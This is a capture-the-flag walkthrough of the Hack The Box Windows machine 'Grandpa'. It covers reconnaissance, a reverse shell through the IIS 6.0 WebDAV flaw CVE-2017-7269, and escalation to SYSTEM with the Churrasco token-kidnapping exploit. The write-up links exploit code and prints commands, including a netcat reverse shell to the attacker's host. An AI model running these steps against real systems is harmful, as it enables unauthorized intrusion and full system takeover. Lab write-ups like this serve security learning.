+++
draft = true
date = 2021-07-13T07:04:02+01:00
title = "Grandpa"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 0
+++

# Machine info

- OS : Windows
- Difficulty : Easy
- Points : 20
- IP : 10.10.10.14

# Mind Map

![Grandpa_MindMap](/images/htb/grandpa_mindmap.png)

&nbsp;

# Recon

Let's see the `nmap` scan result:

```
Nmap scan report for 10.10.10.14
Host is up, received user-set (0.27s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-ntlm-info: 
|   Target_Name: GRANPA
|   NetBIOS_Domain_Name: GRANPA
|   NetBIOS_Computer_Name: GRANPA
|   DNS_Domain_Name: granpa
|   DNS_Computer_Name: granpa
|_  Product_Version: 5.2.3790
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Mon, 12 Jul 2021 19:43:22 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows XP SP2 or SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=7/12%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=60EC9866%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10B%TI=I%II=I%SS=S%TS=0)
OPS(O1=M54BNW0NNT00NNS%O2=M54BNW0NNT00NNS%O3=M54BNW0NNT00%O4=M54BNW0NNT00NNS%O5=M54BNW0NNT00NNS%O6=M54BNNT00NNS)
WIN(W1=FAF0%W2=FAF0%W3=FAF0%W4=FAF0%W5=FAF0%W6=FAF0)
ECN(R=Y%DF=N%TG=80%W=FAF0%O=M54BNW0NNS%CC=N%Q=)
T1(R=Y%DF=N%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=N%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=80%CD=Z)
```
The machine is very similar to the Granny machine. `WebDAV` is enabled and only port `80` open, showing an 'Under Construction' page.

![Grandpa_UnderConstruction](/images/htb/grandpa_under_construction.png)

&nbsp;

# Enumeration

We can try to run `davtest` to check if there is some chance to upload files, but the test failed for all of the extensions:

```
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://localhost
********************************************************
NOTE    Random string for this session: JSfna5TZC
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     php     FAIL
PUT     jhtml   FAIL
PUT     pl      FAIL
PUT     html    FAIL
PUT     cgi     FAIL
PUT     cfm     FAIL
PUT     txt     FAIL
PUT     aspx    FAIL
PUT     asp     FAIL
PUT     shtml   FAIL
PUT     jsp     FAIL

********************************************************
```

The HTTP server appears to be `IIS 6.0`, that is vulnerable to *CVE-2017-7269*. 

Like in Granny, we can obtain a reverse shell exploiting the *CVE-2017-7269*. 
The exploit script can be found at this link -> <https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell>

&nbsp;

# Exploitation

Launching the exploit code with the requested arguments:

```
$ python cve-2017-7269.py 10.10.10.14 80 10.10.17.36 8989                               1 ⨯
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa...................
................................................
```

We get a shell as NT AUTHORITY\Network Service:

```
$ nc -nlvp 8989    
listening on [any] 8989 ...
connect to [10.10.17.36] from (UNKNOWN) [10.10.10.14] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

Once we are inside the machine, a vald user is found - Harry - but the access to its folder is denied:

```
C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings

04/12/2017  05:32 PM    <DIR>          .
04/12/2017  05:32 PM    <DIR>          ..
04/12/2017  05:12 PM    <DIR>          Administrator
04/12/2017  05:03 PM    <DIR>          All Users
04/12/2017  05:32 PM    <DIR>          Harry
               0 File(s)              0 bytes
               5 Dir(s)  18,091,188,224 bytes free

C:\Documents and Settings>cd Harry
cd Harry
Access is denied.
```

&nbsp;

# Privilege Escalation 

## Network Service -> SYSTEM

Launching the systeminfo command, we can see that the target machine has only one hotfix update installed, meaning that it is probably vulnerable to different exploits. Like in Granny, we can save that output and pass it to `Windows Exploit Suggester` to check for possible exploits. 

But we already know one working exploit that abuses **Token Kidnapping**, which is an elevation of privilege vulnerability that could allow an attacker to go from authenticated user to *LocalSystem* privileges. An attacker can escalate their privileges on a system if they can control the *SeImpersonatePrivilege* token.  An attacker would need to be executing code in the context of a Windows service to use this exploit.

Let's first check the privileges related to our current shell:

```
C:\Documents and Settings>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

The `SeImpersontePrivilege` is enabled, meaning that we can perform the exploit. 


Here is the code-> <https://github.com/Re4son/Churrasco/raw/master/churrasco.exe>


In order to obtain a SYSTEM shell, we will first copy the binary exploit and the `nc.exe` executable to the target machine via a `smbserver`. Our goal is to then launch the exploit code specifying a command that will launch `nc` towards our machine:


```
$ sudo python3 /opt/impacket/examples/smbserver.py exploit .
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```
C:\wmpub>copy \\10.10.17.36\exploit\nc.exe nc.exe
copy \\10.10.17.36\exploit\nc.exe nc.exe
        1 file(s) copied.
```

```
C:\wmpub>copy \\10.10.17.36\exploit\churrasco.exe exploit.exe
copy \\10.10.17.36\exploit\churrasco.exe exploit.exe
        1 file(s) copied.
```
**Note**: we are copying the files under `C:\wmpub` because here we have write permissions. 

Now we launch the exploit specigying the program to execute after the connection with the `-e` switch:

```
C:\wmpub>.\exploit.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.17.36 8787"
.\exploit.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.17.36 8787"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 684 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 688 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 692 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 700 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x734
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x72c
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```

And we get a SYSTEM shell on our listener:

```
$ nc -nlvp 8787    
listening on [any] 8787 ...
connect to [10.10.17.36] from (UNKNOWN) [10.10.10.14] 1040
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```

**Note**: flags are under `C:\Documents and Setting\Harry\Desktop` and `C:\Documents and Setting\Administrator\Desktop`.
